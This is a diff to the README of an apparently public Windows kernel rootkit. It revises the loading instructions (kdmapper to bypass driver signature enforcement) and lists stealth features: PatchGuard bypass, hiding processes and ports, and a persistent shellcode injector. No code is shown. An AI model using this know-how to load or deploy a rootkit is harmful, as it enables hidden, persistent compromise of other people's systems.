@@ -9,8 +9,8 @@
 
 
 ## Rootkit Features
-Rootkit can be loaded with Black Angel Loader which is modified [kdmapper](https://github.com/TheCruZ/kdmapper) bypassing DSE. Project [driver-hijack](https://github.com/not-wlan/driver-hijack) is used to maintain full driver functionality such as callback support.
-- DSE Bypass
+Rootkit can be loaded with [kdmapper](https://github.com/TheCruZ/kdmapper) to bypass DSE, Black Angel Loader may not be working properly yet. Project [driver-hijack](https://github.com/not-wlan/driver-hijack) is used to maintain full driver functionality such as callback support.
+- DSE Bypass (No need to turn test signing on)
 - KPP Bypass
 - Hide processes
 - Hide ports (TCP/UDP)
@@ -19,13 +19,6 @@ Rootkit can be loaded with Black Angel Loader which is modified [kdmapper](https
 - Shellcode injector (Unkillable shellcode. Even if process dies, shellcode can still run)
 - (TODO) Hide files/directories
 - (TODO) Hide registry keys
-
-## Angel Support
-Functions that you can implement into your program to be able to do direct kernel calls. More functions will be added in a future.
-- ZwProtectVirtualMemory
-- MmCopyVirtualMemory
-- ZwQueryInformationProcess
-- ZwUnmapViewOfSection
 
 ## Additional Info
 - Remember to change [ACTIVE_PROCESS_LINKS](https://github.com/XaFF-XaFF/Black-Angel-Rootkit/blob/f4a5c762ae864b7395a6a03b8d46fdeda6a8bb25/Black%20Angel%20Rootkit/rootkit.hpp#L7) offset corresponding to your Windows versions. Current offset has been tested on Windows 10/11 Pro 21H2.
